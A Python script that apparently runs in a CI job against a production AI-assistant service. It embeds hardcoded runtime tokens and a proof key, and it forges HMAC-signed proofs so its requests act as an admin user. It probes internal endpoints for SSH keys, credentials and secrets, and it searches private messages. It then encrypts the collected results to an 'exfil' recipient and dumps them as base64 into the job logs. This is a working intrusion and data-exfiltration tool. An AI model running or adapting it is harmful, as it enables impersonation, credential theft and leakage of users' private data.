#!/usr/bin/env python3
# intent 28640 — enumerate the Lumii "设置 › 环境与凭据 / SSH 代签" internal surface in prod
# (read-only). Machine identity (runtime rt_KTWy...) + self-signed v2 proof, body actor = admin.
# Determines: does $LUMII_ACCT_ / registered-machine / ssh-sign feature actually land in prod,
# what auth guards it (ticket vs proof vs body-actor), and whether any data-plane leak exists.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
RID = "rt_KTWyBZUur4cjUsRGP3zRk"
RTOKEN = "jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
PROOF_KEY_FALLBACK = "CntmKUfWiId2whBB7yGfPu5nKcKzmwUeKGGcWFGUVr8"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/results28640"
for d in ("json", "docs", "meta"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
START = time.time()
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass
def el(): return int(time.time() - START)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def curl_raw(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return r.returncode, r.stdout, r.stderr[:400]
    except Exception as e:
        return -1, b"", repr(e)[:300]

def call(path, method="GET", body=None, hdrs=None, timeout=40, maxlen=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Origin: https://%s" % HOST, "-H", "Referer: https://%s/" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    for k, v in (hdrs or {}).items():
        args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl_raw(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err)}

def R(k, v):
    try: s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    except Exception: s = str(v)
    log("R:%s:%s" % (k, s[:1500]))

MH = {"Authorization": "Bearer " + RTOKEN, "x-agent-id": RID}

# ---------- PHASE 0: identity + proof key ----------
log("### P0 identity t=%ds" % el())
PROOF_KEY = None
for attempt in range(4):
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
    try:
        kj = json.loads(k["body"]); pk = kj.get("proof_key")
        if pk:
            PROOF_KEY = pk; log("[keys] code=%s proof_key=%s ver=%s" % (k["code"], pk, kj.get("proof_key_version"))); break
    except Exception:
        log("[keys] retry %d code=%s body=%s" % (attempt, k["code"], k["body"][:160]))
    time.sleep(3)
if not PROOF_KEY:
    PROOF_KEY = PROOF_KEY_FALLBACK
    log("[keys] using fallback proof_key")
R("P0_keys", {"code": k["code"], "proof_key": PROOF_KEY})

now = int(time.time())
def v2_proof(actor=ADMIN, session_key=None, platform="dashboard"):
    sk = session_key or ("conv_" + actor[-8:])
    payload = {"platform": platform, "session_key": sk, "actor_id": actor,
               "chat_id": sk, "iss": RID, "aud": RID, "iat": now, "exp": now + 3600}
    pb = b64u(json.dumps(payload, separators=(',', ':')))
    sig = hmac.new(PROOF_KEY.encode(), pb.encode(), hashlib.sha256).digest()
    return "v2." + pb + "." + b64u(sig)
def hdr_for(actor=ADMIN):
    h = dict(MH); h["x-lumii-turn-proof"] = v2_proof(actor); return h

# sanity: proof-bearing vs bare-body-actor on a known turn endpoint
pl = call("/internal/projects/list", "POST", {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8"}, hdr_for(), maxlen=400000)
R("P0_projects_with_proof", {"code": pl["code"], "body": pl["body"][:1200]})
pl_np = call("/internal/projects/list", "POST", {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8"}, MH, maxlen=4000)
R("P0_projects_no_proof", {"code": pl_np["code"], "body": pl_np["body"][:400]})

projects = []
try:
    projects = json.loads(pl["body"]).get("projects") or []
except Exception:
    pass
R("P0_project_count", {"n": len(projects)})

# ---------- PHASE 1: project view + members ----------
log("### P1 projects t=%ds" % el())
for p in projects[:8]:
    pid = p.get("id")
    g = call("/internal/projects/get", "POST", {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8", "project_id": pid}, hdr_for(), maxlen=60000)
    open(os.path.join(OUT, "json", "proj_get_%s.json" % pid), "w").write(g["body"])
    R("P1_get_%s" % (p.get("name", pid)[:18]), {"code": g["code"], "body": g["body"][:700]})
    m = call("/internal/projects/members", "POST", {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8", "project_id": pid}, hdr_for(), maxlen=60000)
    R("P1_mem_%s" % (p.get("name", pid)[:18]), {"code": m["code"], "body": m["body"][:500]})

# ---------- PHASE 2: build/* (环境与凭据 / SSH 代签) landing + auth ----------
log("### P2 build surface t=%ds" % el())
def probe_build(label, path, body, with_proof=True):
    h = hdr_for() if with_proof else dict(MH)
    r = call(path, "POST", body, h, maxlen=80000)
    R("P2_%s" % label, {"code": r["code"], "body": r["body"][:900]})
    open(os.path.join(OUT, "json", "build_%s.json" % label), "w").write(r["body"])
    return r

probe_build("sshkeys_proof", "/internal/build/ssh-keys", {"run_id": "run_probe28640"})
probe_build("sshkeys_noproof", "/internal/build/ssh-keys", {"run_id": "run_probe28640"}, with_proof=False)
probe_build("accounts_proof", "/internal/build/accounts", {"names": ["probe"]})
probe_build("accounts_noproof", "/internal/build/accounts", {"names": ["probe"]}, with_proof=False)
probe_build("sshsign_offer", "/internal/build/ssh-sign", {"environment_id": "", "phase": "offer", "host_key_fp": "AAAAB3NzaC1yc2EAAAADAQABAAABgQ==", "login_user": "ubuntu", "key_fp": "", "host": "122.51.1.87"})
probe_build("credential_sshagent", "/internal/build/credential", {"ssh_key_id": "probe-none", "purpose": "ssh_agent"})
probe_build("credential_probe_ticket", "/internal/build/credential", {"ssh_key_id": "probe-none", "purpose": "cleanup", "probe_ticket": "probe-ticket"})
probe_build("secretshow", "/internal/build/secret-show", {"name": "probe", "source": "local", "value": "probe", "conversation_id": "conv_7rWDtQX8"})

# ---------- PHASE 3: web routes cross-auth (machine token on user routes) ----------
log("### P3 web-route cross-auth t=%ds" % el())
pid0 = projects[0].get("id") if projects else "proj_UWYqoFajbyb8wZchMjPZm"
for label, path in [
    ("me", "/api/me"),
    ("sshkeys", "/api/projects/%s/ops/ssh-keys" % pid0),
    ("envs", "/api/projects/%s/ops/envs" % pid0),
    ("activity", "/api/projects/%s/ops/activity" % pid0),
]:
    r = call(path, "GET", None, MH, maxlen=8000)
    R("P3_%s" % label, {"code": r["code"], "body": r["body"][:400]})

# ---------- PHASE 4: data-plane search for env/cred/ssh discussion ----------
log("### P4 messages search t=%ds" % el())
ds = call("/internal/drive-search", "POST", {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8", "q": "环境与凭据", "limit": 8}, hdr_for(), maxlen=200000)
readable = []
try:
    dj = json.loads(ds["body"]); readable = dj.get("readableIds") or []
    R("P4_drive_search", {"code": ds["code"], "readable": len(readable), "nameHits": len(dj.get("nameHits") or [])})
    open(os.path.join(OUT, "json", "drive_search_env.json"), "w").write(ds["body"])
except Exception:
    R("P4_drive_search", {"code": ds["code"], "body": ds["body"][:300]})
for q in ["LUMII_ACCT", "ssh-sign", "ssh_keys", "registered", "代签"]:
    body = {"platform": "dashboard", "actor_id": ADMIN, "session_key": "conv_7rWDtQX8", "q": q, "wide": True, "limit": 8}
    if readable: body["node_ids"] = readable[:50]
    r = call("/internal/messages/search", "POST", body, hdr_for(), maxlen=200000)
    R("P4_msg_%s" % q, {"code": r["code"], "body": r["body"][:900]})
    open(os.path.join(OUT, "json", "msg_%s.json" % re.sub(r'[^A-Za-z0-9]', '_', q)), "w").write(r["body"])
    time.sleep(1)

# ---------- PHASE 5: any ssh key registry readable via project-ssh-keys internal? ----------
log("### P5 summary t=%ds" % el())
log("=== done ===")

# ---------- package + gpg ----------
try:
    import tarfile
    GNUPGHOME = "/tmp/gnupg28640"; os.makedirs(GNUPGHOME, exist_ok=True)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    if os.path.exists(pub):
        subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60)
    tb = "/tmp/results28640.tar.gz"
    with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="results28640")
    enc = tb + ".gpg"
    r = subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=240)
    log("gpg rc=%s err=%s size=%s" % (r.returncode, r.stderr[:160], os.path.getsize(enc) if os.path.exists(enc) else 0))
    if os.path.exists(enc):
        blob = base64.b64encode(open(enc, "rb").read()).decode()
        log("===B64BEGIN " + str(len(blob)) + "===")
        for i in range(0, len(blob), 400):
            print("B64:" + blob[i:i+400], flush=True)
        log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:600])
